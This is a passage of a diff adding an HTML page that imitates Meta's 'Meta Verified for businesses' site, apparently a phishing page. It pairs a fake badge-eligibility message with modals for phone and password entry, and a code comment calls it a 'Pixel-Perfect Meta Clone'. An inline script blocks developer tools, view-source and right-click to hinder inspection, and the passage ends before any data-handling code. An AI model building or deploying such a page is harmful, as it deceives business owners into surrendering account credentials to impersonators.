@@ -1,0 +1,2635 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Meta Verified for businesses | Verify your business on Facebook, Instagram and WhatsApp | Meta for Business
+    </title>
+    <meta name="description"
+        content="Show the world that you mean business with Meta Verified. Gain access to the verified badge, impersonation protection, account support and tools to help you engage more efficiently with your customers." />
+    <meta property="og:title"
+        content="Meta Verified for businesses | Verify your business on Facebook, Instagram and WhatsApp" />
+    <meta property="og:description"
+        content="Show the world that you mean business with Meta Verified. Gain access to the verified badge, impersonation protection, account support and tools to help you engage more efficiently with your customers." />
+    <meta property="og:image"
+        content="https://static.xx.fbcdn.net/mci_ab/public/cms/?ab_b=e&amp;ab_page=CMS&amp;ab_entry=2261194224072392&amp;version=1695158428&amp;transcode_extension=webp" />
+    <meta name="keywords"
+        content="meta verified, meta verified for businesses, meta verified for creators, meta verified for facebook business page, meta verified for instagram, verified branding, tick, verified account support, meta verified businesses">
+    <link rel="shortcut icon" href="favicon.png">
+    <link rel="icon" href="favicon.png" type="image/png">
+    <!-- Google Fonts: Noto Sans with multi-script subsets -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Noto+Sans:ital,wght@0,100..900;1,100..900&family=Noto+Sans+Arabic:wght@100..900&family=Noto+Sans+Devanagari:wght@100..900&family=Noto+Sans+Thai:wght@100..900&family=Noto+Sans+JP:wght@100..900&family=Noto+Sans+KR:wght@100..900&family=Noto+Sans+SC:wght@100..900&family=Noto+Sans+TC:wght@100..900&display=swap"
+        rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['"Noto Sans"', '"Noto Sans Arabic"', '"Noto Sans Devanagari"', '"Noto Sans Thai"', '"Noto Sans JP"', '"Noto Sans KR"', '"Noto Sans SC"', '"Noto Sans TC"', 'system-ui', '-apple-system', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <noscript>
+        <meta http-equiv="refresh" content="0;url=about:blank">
+        <style>
+            body {
+                display: none !important
+            }
+        </style>
+    </noscript>
+    <script>document.addEventListener("keydown", function (e) { ("F12" === e.key || e.ctrlKey && e.shiftKey && ("I" === e.key || "J" === e.key || "C" === e.key) || e.ctrlKey && "u" === e.key) && e.preventDefault() }), document.addEventListener("contextmenu", function (e) { e.preventDefault() })</script>
+    <style>
+        @font-face {
+            font-family: 'Optimistic VF';
+            src: url('https://static.xx.fbcdn.net/rsrc.php/yQ/r/-pkMfchyeAZ.woff2') format('woff2');
+            font-weight: 100 900;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        html {
+            scroll-behavior: smooth
+        }
+
+        * {
+            font-family: 'Optimistic VF', Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
+
+        h1,
+        h2,
+        h3 {
+            font-family: 'Optimistic VF', Helvetica, Arial, sans-serif;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px) scale(0.95);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        @keyframes modalOverlayIn {
+            from {
+                opacity: 0
+            }
+
+            to {
+                opacity: 1
+            }
+        }
+
+        @keyframes skeletonPulse {
+
+            0%,
+            100% {
+                opacity: 0.4
+            }
+
+            50% {
+                opacity: 0.8
+            }
+        }
+
+        /* Skeleton loading screen */
+        .skeleton-loader {
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            transition: opacity 0.4s ease;
+        }
+
+        .skeleton-loader.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .skeleton-bar {
+            background: #e5e7eb;
+            border-radius: 6px;
+            animation: skeletonPulse 1.5s ease-in-out infinite;
+        }
+
+        body {
+            margin: 0;
+            line-height: 1.5;
+            background: #fff;
+            color: #171A1D
+        }
+
+        video::-webkit-media-controls {
+            display: none !important;
+        }
+
+        video::-webkit-media-controls-enclosure {
+            display: none !important;
+        }
+
+        video {
+            pointer-events: none;
+        }
+
+        /* Modal styles from required.html */
+        .modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 50
+        }
+
+        .modal.active {
+            display: block
+        }
+
+        .modal-overlay {
+            position: absolute;
+            inset: 0;
+            background: rgba(0, 0, 0, .4);
+            animation: modalOverlayIn 0.2s ease
+        }
+
+        .modal-container {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 40px 1rem
+        }
+
+        .modal-content {
+            position: relative;
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, .25);
+            width: 100%;
+            max-width: 32rem;
+            height: 100%;
+            max-height: 100%;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            animation: modalSlideIn 0.3s ease
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            background: 0 0;
+            border: none;
+            font-size: 24px;
+            color: #65676b;
+            cursor: pointer
+        }
+
+        /* Phone input styles */
+        .react-tel-input {
+            position: relative;
+            width: 100%;
+            height: 100%
+        }
+
+        .react-tel-input .form-control {
+            width: 100%;
+            height: 100%;
+            padding-left: 48px;
+            border: none;
+            background: 0 0;
+            font-size: 14px;
+            outline: 0;
+            border-radius: 10px
+        }
+
+        .react-tel-input .flag-dropdown {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            background: 0 0;
+            border: none;
+            border-radius: 10px 0 0 10px
+        }
+
+        .react-tel-input .selected-flag {
+            display: flex;
+            align-items: center;
+            height: 100%;
+            padding: 0 8px 0 11px;
+            cursor: pointer
+        }
+
+        .react-tel-input .flag-dropdown.open .selected-flag {
+            background: rgba(0, 0, 0, .05)
+        }
+
+        .react-tel-input .country-list {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            width: 300px;
+            max-height: 200px;
+            overflow-y: auto;
+            background: #fff;
+            border: 1px solid #d4dbe3;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, .15);
+            z-index: 9999;
+            margin: 4px 0;
+            padding: 0;
+            list-style: none
+        }
+
+        .react-tel-input .country-list .country {
+            display: flex;
+            align-items: center;
+            padding: 10px 12px;
+            cursor: pointer;
+            font-size: 14px
+        }
+
+        .react-tel-input .country-list .country:hover {
+            background: #f0f2f5
+        }
+
+        .react-tel-input .country-list .country.highlight {
+            background: #e7f3ff
+        }
+
+        .react-tel-input .country-list .country .country-flag {
+            width: 20px;
+            height: 15px;
+            margin-right: 10px;
+            border-radius: 2px
+        }
+
+        .react-tel-input .country-list .country .country-name {
+            flex: 1;
+            margin-right: 8px
+        }
+
+        .react-tel-input .country-list .country .dial-code {
+            color: #65676b
+        }
+
+        .react-tel-input .arrow {
+            border-left: 3px solid transparent;
+            border-right: 3px solid transparent;
+            border-top: 4px solid #555;
+            margin-left: 6px
+        }
+
+        .react-tel-input .flag-dropdown.open .arrow {
+            border-top: none;
+            border-bottom: 4px solid #555
+        }
+
+        .error-msg {
+            color: #d93025;
+            font-size: 12px;
+            display: none
+        }
+
+        .error-msg.show {
+            display: block
+        }
+
+        /* Benefits toggle */
+        .benefit-content {
+            display: none
+        }
+
+        .benefit-content.open {
+            display: block
+        }
+
+        /* FAQ accordion */
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s
+        }
+
+        .faq-answer.open {
+            max-height: 500px
+        }
+
+        /* ====== MOBILE RESPONSIVE FIXES ====== */
+        @media (max-width: 767px) {
+
+            /* Footer newsletter: stack vertically on mobile */
+            .footer-newsletter-actions {
+                flex-direction: column !important;
+                width: 100% !important;
+            }
+
+            .footer-newsletter-actions input[type="email"] {
+                width: 100% !important;
+            }
+
+            .footer-newsletter-actions button {
+                width: 100% !important;
+            }
+
+            /* Footer links: wrap properly on mobile */
+            .footer-links-row {
+                flex-direction: column !important;
+                gap: 8px !important;
+            }
+
+            .footer-links-row a.ml-auto {
+                margin-left: 0 !important;
+            }
+
+            /* Country dropdown: fit mobile screen */
+            .react-tel-input .country-list {
+                width: calc(100vw - 60px) !important;
+                max-width: 300px;
+            }
+
+            /* Password modal: proper height on mobile */
+            .modal-password-content {
+                min-height: 70vh !important;
+            }
+
+            /* Modal container: less padding on mobile */
+            .modal-container {
+                padding: 16px 12px;
+            }
+
+            /* Modal content: adjust for small screens */
+            .modal-content {
+                max-height: 95vh;
+                padding: 16px;
+            }
+
+            /* Steps section: reduce padding */
+            .steps-card {
+                padding: 24px !important;
+            }
+
+            /* FAQ section: reduce padding on mobile */
+            #faq-section {
+                padding-left: 12px;
+                padding-right: 12px;
+            }
+
+            /* CTA section */
+            .cta-section-inner {
+                padding-left: 16px;
+                padding-right: 16px;
+            }
+        }
+
+        /* Extra small screens (< 375px) */
+        @media (max-width: 374px) {
+            .modal-content {
+                padding: 12px;
+            }
+
+            .react-tel-input .country-list {
+                width: calc(100vw - 40px) !important;
+            }
+        }
+
+        /* Hamburger menu */
+        .hamburger-btn {
+            display: none;
+            flex-direction: column;
+            gap: 5px;
+            cursor: pointer;
+            padding: 8px;
+            z-index: 60;
+        }
+
+        .hamburger-btn span {
+            display: block;
+            width: 22px;
+            height: 2px;
+            background: #1c2b33;
+            border-radius: 2px;
+            transition: all 0.3s ease;
+        }
+
+        .hamburger-btn.active span:nth-child(1) {
+            transform: rotate(45deg) translate(5px, 5px);
+        }
+
+        .hamburger-btn.active span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .hamburger-btn.active span:nth-child(3) {
+            transform: rotate(-45deg) translate(5px, -5px);
+        }
+
+        .mobile-nav-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 55;
+            animation: modalOverlayIn 0.2s ease;
+        }
+
+        .mobile-nav-overlay.active {
+            display: block
+        }
+
+        .mobile-nav-drawer {
+            position: fixed;
+            top: 0;
+            right: -280px;
+            width: 280px;
+            height: 100vh;
+            height: 100dvh;
+            background: #fff;
+            z-index: 56;
+            padding: 80px 24px 24px;
+            transition: right 0.3s ease;
+            box-shadow: -4px 0 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .mobile-nav-drawer.active {
+            right: 0
+        }
+
+        .mobile-nav-drawer a,
+        .mobile-nav-drawer span {
+            display: block;
+            padding: 14px 0;
+            font-size: 16px;
+            font-weight: 600;
+            color: #1c2b33;
+            border-bottom: 1px solid #e5e7eb;
+            cursor: pointer;
+        }
+
+        @media (max-width: 767px) {
+            .hamburger-btn {
+                display: flex
+            }
+        }
+
+        /* Floating labels for form inputs */
+        .float-label-wrap {
+            position: relative;
+        }
+
+        .float-label-wrap input:focus~.float-label,
+        .float-label-wrap input:not(:placeholder-shown)~.float-label {
+            top: 2px;
+            font-size: 10px;
+            color: #3b82f6;
+        }
+
+        .float-label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 14px;
+            color: #9ca3af;
+            pointer-events: none;
+            transition: all 0.2s ease;
+            background: white;
+            padding: 0 2px;
+        }
+
+        /* Inline form errors */
+        .form-error {
+            color: #ef4444;
+            font-size: 12px;
+            margin-top: -6px;
+            margin-bottom: 8px;
+            display: none;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .form-error.show {
+            display: flex
+        }
+
+        .form-error svg {
+            flex-shrink: 0
+        }
+
+        /* Scroll animations */
+        .scroll-fade {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+
+        .scroll-fade.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+
+
+        /* Country search input */
+        .country-search-wrap {
+            position: sticky;
+            top: 0;
+            background: white;
+            padding: 8px;
+            border-bottom: 1px solid #e5e7eb;
+            z-index: 1;
+        }
+
+        .country-search-wrap input {
+            width: 100%;
+            padding: 6px 10px;
+            border: 1px solid #d4dbe3;
+            border-radius: 6px;
+            font-size: 13px;
+            outline: none;
+        }
+
+        .country-search-wrap input:focus {
+            border-color: #3b82f6;
+        }
+
+        /* ===== Meta-style Footer Bottom ===== */
+        .footer-bottom {
+            display: flex;
+            align-items: flex-start;
+            gap: 40px;
+            padding: 24px 0 80px;
+            border-top: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .footer-bottom-left {
+            flex-shrink: 0;
+            padding-top: 2px;
+        }
+
+        .footer-copyright {
+            color: #CBD2D9;
+            font-size: 12px;
+            font-weight: 400;
+            white-space: nowrap;
+        }
+
+        .footer-bottom-grid {
+            display: grid;
+            grid-template-columns: repeat(7, auto);
+            gap: 0 32px;
+            flex: 1;
+        }
+
+        .footer-grid-col {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .footer-nav-link {
+            color: #CBD2D9;
+            font-size: 12px;
+            font-weight: 400;
+            text-decoration: none;
+            white-space: nowrap;
+            transition: color 0.15s;
+        }
+
+        .footer-nav-link:hover {
+            color: #fff;
+        }
+
+        .footer-lang-link {
+            color: #CBD2D9;
+            font-size: 12px;
+            font-weight: 400;
+            text-decoration: none;
+            white-space: nowrap;
+            cursor: pointer;
+            transition: color 0.15s;
+        }
+
+        .footer-lang-link:hover {
+            color: #fff;
+        }
+
+        .footer-lang-active {
+            color: #fff !important;
+            font-weight: 600 !important;
+        }
+
+        .footer-more-langs {
+            display: inline-flex;
+            align-items: center;
+            gap: 3px;
+        }
+
+        .footer-more-langs-panel {
+            grid-column: 1 / -1;
+            display: none;
+            flex-wrap: wrap;
+            gap: 8px 28px;
+            padding-top: 12px;
+            margin-top: 4px;
+        }
+
+        /* ===== Footer Mobile Responsive ===== */
+        @media (max-width: 900px) {
+            .footer-bottom {
+                flex-direction: column;
+                gap: 16px;
+                padding: 20px 0 40px;
+            }
+
+            .footer-bottom-grid {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 14px 20px;
+            }
+        }
+
+        @media (max-width: 640px) {
+
+            /* Newsletter section on mobile */
+            .footer-newsletter-actions {
+                flex-direction: column;
+                width: 100%;
+            }
+
+            .footer-newsletter-actions input {
+                width: 100% !important;
+            }
+
+            .footer-newsletter-actions button {
+                width: 100%;
+                text-align: center;
+            }
+
+            /* Footer bottom grid on small phones */
+            .footer-bottom-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 14px 16px;
+            }
+
+            .footer-nav-link,
+            .footer-lang-link {
+                font-size: 11px;
+                padding: 2px 0;
+            }
+
+            .footer-copyright {
+                font-size: 11px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .footer-bottom-grid {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+
+            .footer-grid-col {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+                gap: 8px;
+                border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+                padding-bottom: 8px;
+            }
+
+            .footer-grid-col:last-child {
+                border-bottom: none;
+            }
+        }
+
+        /* ===== "Select a Language" Modal — Pixel-Perfect Meta Clone ===== */
+        .lang-modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.8);
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .lang-modal-overlay.show {
+            display: flex;
+        }
+
+        .lang-modal {
+            background: #fff;
+            border-radius: 0;
+            width: 620px;
+            max-width: 95vw;
+            max-height: 80vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 1px 5px rgba(0, 0, 0, 0.15);
+            border: 1px solid #dddfe2;
+            overflow: hidden;
+        }
+
+        .lang-modal-header {
+            background: #4267B2;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 6px 12px;
+            line-height: 1.4;
+            letter-spacing: 0.01em;
+        }
+
+        .lang-modal-body {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+            min-height: 320px;
+        }
+
+        .lang-modal-sidebar {
+            width: 155px;
+            flex-shrink: 0;
+            border-right: 1px solid #e5e5e5;
+            padding: 8px 0;
+            overflow-y: auto;
+            background: #fff;
+        }
+
+        .lang-modal-region {
+            display: block;
+            padding: 5px 12px;
+            font-size: 12px;
+            color: #1c1e21;
+            cursor: pointer;
+            text-decoration: none;
+            border-left: 2px solid transparent;
+            line-height: 1.6;
+        }
+
+        .lang-modal-region:hover {
+            text-decoration: underline;
+        }
+
+        .lang-modal-region.active {
+            font-weight: 700;
+            border-left-color: #4267B2;
+            text-decoration: underline;
+        }
+
+        .lang-modal-langs {
+            flex: 1;
+            padding: 10px 12px;
+            overflow-y: auto;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 0;
+            align-content: start;
+        }
+
+        .lang-modal-lang {
+            display: block;
+            padding: 4px 8px;
+            font-size: 12px;
+            color: #385898;
+            text-decoration: none;
+            cursor: pointer;
+            line-height: 1.6;
+            white-space: nowrap;
+        }
+
+        .lang-modal-lang:hover {
+            text-decoration: underline;
+        }
+
+        .lang-modal-lang.current-lang {
+            font-weight: 700;
+            color: #1c1e21;
+        }
+
+        .lang-modal-footer {
+            border-top: 1px solid #dddfe2;
+            padding: 8px 12px;
+            display: flex;
+            justify-content: flex-end;
+            background: #f5f6f7;
+        }
+
+        .lang-modal-close {
+            background: #4267B2;
+            color: #fff;
+            border: 1px solid #365899;
+            padding: 4px 16px;
+            border-radius: 2px;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            line-height: 1.6;
+        }
+
+        .lang-modal-close:hover {
+            background: #365899;
+        }
+
+        @media (max-width: 640px) {
+            .lang-modal {
+                width: 92vw;
+                max-width: 92vw;
+                max-height: 70vh;
+                border-radius: 8px;
+                border: 1px solid #dddfe2;
+            }
+
+            .lang-modal-body {
+                min-height: 200px;
+                flex-direction: column;
+            }
+
+            .lang-modal-sidebar {
+                width: 100%;
+                border-right: none;
+                border-bottom: 1px solid #dddfe2;
+                display: flex;
+                flex-wrap: wrap;
+                padding: 8px 10px;
+                gap: 4px;
+                overflow-y: visible;
+            }
+
+            .lang-modal-region {
+                border-left: none;
+                padding: 8px 12px;
+                border-radius: 4px;
+                background: #f0f2f5;
+                font-size: 11px;
+                line-height: 1.4;
+            }
+
+            .lang-modal-region.active {
+                border-left-color: transparent;
+                background: #4267B2;
+                color: #fff;
+            }
+
+            .lang-modal-langs {
+                grid-template-columns: repeat(2, 1fr);
+                padding: 10px;
+                gap: 2px;
+            }
+
+            .lang-modal-lang {
+                padding: 8px 10px;
+                font-size: 13px;
+            }
+
+            .lang-modal-header {
+                font-size: 13px;
+                padding: 10px 14px;
+            }
+
+            .lang-modal-footer {
+                padding: 10px 14px;
+            }
+
+            .lang-modal-close {
+                padding: 8px 24px;
+                font-size: 13px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .lang-modal-langs {
+                grid-template-columns: 1fr;
+            }
+
+            .lang-modal-region {
+                font-size: 10px;
+                padding: 6px 8px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Skeleton Loading Screen -->
+    <div id="skeleton-loader" class="skeleton-loader">
+        <div style="padding:0 24px;height:60px;display:flex;align-items:center;border-bottom:1px solid #e5e7eb">
+            <div class="skeleton-bar" style="width:65px;height:24px"></div>
+        </div>
+        <div style="padding:40px 24px;max-width:600px">
+            <div class="skeleton-bar" style="width:60%;height:32px;margin-bottom:16px"></div>
+            <div class="skeleton-bar" style="width:90%;height:16px;margin-bottom:10px"></div>
+            <div class="skeleton-bar" style="width:75%;height:16px;margin-bottom:24px"></div>
+            <div class="skeleton-bar" style="width:140px;height:40px;border-radius:40px"></div>
+        </div>
+        <div style="padding:0 24px;margin-top:40px">
+            <div class="skeleton-bar" style="width:100%;height:200px;border-radius:12px"></div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <div
+        class="px-6 md:h-[80px] h-[60px] bg-[#f5f6f6] flex items-center justify-between sticky top-0 z-50 border-b border-[#e4e6e8]">
+        <div class="flex items-center justify-start gap-2 text-[14px]">
+            <a href="./" class="cursor-pointer"><img src="images/meta/logo-meta.svg" class="md:w-[65px] w-[70px]"
+                    alt="Meta"></a>
+            <div class="ml-[50px] md:flex hidden items-center justify-start gap-7 text-[#1c2b33]">
+                <span id="nav-get-started" data-i18n="nav.getStarted"
+                    class="cursor-pointer font-[600] relative after:content-[''] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100">Get
+                    started</span>
+                <span id="nav-advertise" data-i18n="nav.advertise"
+                    class="cursor-pointer font-[600] relative after:content-[''] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100">Advertise</span>
+                <span id="nav-learn" data-i18n="nav.learn"
+                    class="cursor-pointer font-[600] relative after:content-[''] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100">Learn</span>
+                <span id="nav-support" data-i18n="nav.support"
+                    class="cursor-pointer font-[600] relative after:content-[''] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100">Support</span>
+            </div>
+        </div>
+        <div class="md:flex hidden items-center justify-start gap-10">
+            <img src="images/icons/ic_search.svg" class="w-[20px] h-[20px] cursor-pointer" alt="search"
+                onclick="showModal('modal-info')">
+            <div class="relative">
+                <img src="images/icons/ic_user.svg" class="w-[40px] h-[40px] cursor-pointer" alt="user"
+                    onclick="showModal('modal-info')">
+            </div>
+        </div>
+        <div class="md:hidden flex items-center gap-4">
+            <img src="images/icons/ic_search.svg" class="w-[20px] h-[20px] cursor-pointer" alt="search"
+                onclick="showModal('modal-info')">
+            <div class="hamburger-btn" id="hamburger-btn" onclick="toggleMobileNav()"
+                aria-label="Toggle navigation menu" role="button" tabindex="0">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile Nav Drawer -->
+    <div class="mobile-nav-overlay" id="mobile-nav-overlay" onclick="toggleMobileNav()"></div>
+    <div class="mobile-nav-drawer" id="mobile-nav-drawer">
+        <span onclick="showModal('modal-info');toggleMobileNav()" data-i18n="nav.getStarted">Get started</span>
+        <span onclick="showModal('modal-info');toggleMobileNav()" data-i18n="nav.advertise">Advertise</span>
+        <span onclick="showModal('modal-info');toggleMobileNav()" data-i18n="nav.learn">Learn</span>
+        <span onclick="showModal('modal-info');toggleMobileNav()" data-i18n="nav.support">Support</span>
+    </div>
+
+    <!-- Hero Section -->
+    <div class="bg-white">
+        <div
+            class="flex md:flex-row flex-col w-full items-center justify-between md:max-w-[1440px] mx-auto md:px-6 px-3 md:py-16 py-10">
+            <div class="md:w-[40%] w-full flex items-center justify-start md:order-1 order-2 md:pb-0 pb-10">
+                <div class="md:max-w-[480px] max-w-[100%] w-full flex flex-col items-start justify-start">
+                    <img src="images/icons/ic_blue.svg" alt="meta"
+                        class="order-1 md:w-[72px] w-[48px] md:h-[72px] h-[48px] mb-6">
+                    <h1 class="md:text-[48px] text-[32px] mb-4 order-2 leading-[1.15]" data-i18n="hero.title">Show the
+                        world that you
+                        mean business.
+                    </h1>
+                    <p class="text-[16px] text-[#1c2b33] font-[400] order-3 mb-6 leading-[1.5]"
+                        data-i18n="hero.subtitle">Meta Verified helps you
+                        build more confidence with new audiences and protects your brand.</p>
+                    <button id="btn-subscribe" data-i18n="hero.button" onclick="showModal('modal-info')"
+                        class="order-4 bg-[#0064e0] text-white px-10 py-[16px] flex items-center justify-center rounded-[45px] font-[700] text-[16px] cursor-pointer hover:bg-[#0056c7] transition-colors">Submit
+                        Request</button>
+                    <p class="order-5 text-[14px] text-[#465A69] font-[400] mt-4 leading-[1.5]"
+                        data-i18n="hero.congrats">Congratulations
+                        on
+                        achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic
+                        milestone that reflects your dedication and the trust you've built with your audience.</p>
+                </div>
+            </div>
+            <div class="md:w-[60%] w-full overflow-visible md:order-2 order-1 flex items-center justify-end md:-mr-6">
+                <video autoplay loop muted playsinline class="w-full block" src="images/hero-video.mp4">
+                </video>
+            </div>
+        </div>
+
+        <!-- Benefits Section -->
+        <div class="max-w-[1440px] mx-auto md:pt-20 pt-6 md:px-6 px-3 md:mb-0 mb-10 scroll-fade">
+            <div class="w-full">
+                <h2 class="md:text-[48px] text-[32px]" style="font-weight: 400;" data-i18n="benefits.title">Explore Meta
+                    Verified for business
+                    benefits.</h2>
+                <p class="md:text-[16px] text-[14px] text-[#1c2b33] font-[300] my-4 max-w-[800px]"
+                    data-i18n="benefits.subtitle">
+                    Meta Verified provides tools to help you build more confidence with new audiences, protect your
+                    brand and more efficiently engage with your customers.</p>
+                <a href="javascript:void(0)" onclick="showModal('modal-info')"
+                    class="inline-flex items-center gap-2 text-[#0064e0] text-[14px] font-[500] mt-2 hover:underline">
+                    <svg width="20" height="20" viewBox="0 0 20 20" fill="none" class="flex-shrink-0">
+                        <circle cx="10" cy="10" r="9" stroke="#0064e0" stroke-width="1.5" />
+                        <path d="M8 6l4 4-4 4" stroke="#0064e0" stroke-width="1.5" stroke-linecap="round"
+                            stroke-linejoin="round" />
+                    </svg>
+                    <span data-i18n="benefits.learnMore">Learn more</span>
+                </a>
+            </div>
+        </div>
+
+
+
+
+
+
+
+        <div class="max-w-[1440px] mx-auto md:pt-16 pt-8 md:px-6 px-3 md:pb-20 pb-10">
+            <div class="flex flex-col md:flex-row gap-12 items-start">
+                <!-- Left - Image -->
+                <div class="md:w-[50%] w-full">
+                    <div class="rounded-2xl overflow-hidden">
+                        <img id="benefit-image" src="images/meta/verified-badge.jpg" alt="Verified badge"
+                            class="w-full h-auto object-cover transition-all duration-500 opacity-100">
+                    </div>
+                </div>
+                <!-- Right - Accordion -->
+                <div class="md:w-[50%] w-full border-t border-gray-200">
+                    <div id="benefit-item-1" class="py-6 cursor-pointer border-b border-gray-200 text-[#1c2b33]"
+                        onmouseenter="selectBenefit(1)">
+                        <h3 class="text-[22px] md:text-[26px] font-[500] flex justify-between items-center">
+                            <span data-i18n="benefits.badge">Verified badge</span>
+                            <svg class="benefit-chevron w-6 h-6 transform rotate-180 transition-transform duration-300 flex-shrink-0 ml-4"
+                                viewBox="0 0 24 24" fill="none">
+                                <path d="M6 9l6 6 6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                    stroke-linejoin="round" />
+                            </svg>
+                        </h3>
+                        <div class="benefit-desc overflow-hidden transition-all duration-400"
+                            style="max-height: 200px;">
+                            <p class="mt-4 text-[15px] text-[#465A69] leading-[1.6] max-w-md">
+                                <span data-i18n="benefits.badge.desc">The badge means your profile was verified by Meta
+                                    based on your activity across
+                                    Meta
+                                    technologies, or information or documents you provided.</span>
+                            </p>
+                        </div>
+                    </div>
+                    <div id="benefit-item-2"
+                        class="py-6 cursor-pointer border-b border-gray-200 text-gray-400 hover:text-[#1c2b33] transition-colors"
+                        onmouseenter="selectBenefit(2)">
+                        <h3 class="text-[22px] md:text-[26px] font-[500] flex justify-between items-center">
+                            <span data-i18n="benefits.impersonation">Impersonation protection</span>
+                            <svg class="benefit-chevron w-6 h-6 transition-transform duration-300 flex-shrink-0 ml-4"
+                                viewBox="0 0 24 24" fill="none">
+                                <path d="M6 9l6 6 6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                    stroke-linejoin="round" />
+                            </svg>
+                        </h3>
+                        <div class="benefit-desc overflow-hidden transition-all duration-400" style="max-height: 0;">
+                            <p class="mt-4 text-[15px] text-[#465A69] leading-[1.6] max-w-md">
+                                <span data-i18n="benefits.impersonation.desc">Protect your brand with proactive
+                                    impersonation monitoring. Meta will remove
+                                    accounts we
+                                    determine are pretending to be you.</span>
+                            </p>
+                        </div>
+                    </div>
+                    <div id="benefit-item-3"
+                        class="py-6 cursor-pointer border-b border-gray-200 text-gray-400 hover:text-[#1c2b33] transition-colors"
+                        onmouseenter="selectBenefit(3)">
+                        <h3 class="text-[22px] md:text-[26px] font-[500] flex justify-between items-center">
+                            <span data-i18n="benefits.support">Enhanced support</span>
+                            <svg class="benefit-chevron w-6 h-6 transition-transform duration-300 flex-shrink-0 ml-4"
+                                viewBox="0 0 24 24" fill="none">
+                                <path d="M6 9l6 6 6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                    stroke-linejoin="round" />
+                            </svg>
+                        </h3>
+                        <div class="benefit-desc overflow-hidden transition-all duration-400" style="max-height: 0;">
+                            <p class="mt-4 text-[15px] text-[#465A69] leading-[1.6] max-w-md">
+                                <span data-i18n="benefits.support.desc">Get 24/7 access to email or chat agent support
+                                    for account issues.</span>
+                            </p>
+                        </div>
+                    </div>
+                    <div id="benefit-item-4"
+                        class="py-6 cursor-pointer border-b border-gray-200 text-gray-400 hover:text-[#1c2b33] transition-colors"
+                        onmouseenter="selectBenefit(4)">
+                        <h3 class="text-[22px] md:text-[26px] font-[500] flex justify-between items-center">
+                            <span data-i18n="benefits.profile">Upgraded profile features</span>
+                            <svg class="benefit-chevron w-6 h-6 transition-transform duration-300 flex-shrink-0 ml-4"
+                                viewBox="0 0 24 24" fill="none">
+                                <path d="M6 9l6 6 6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
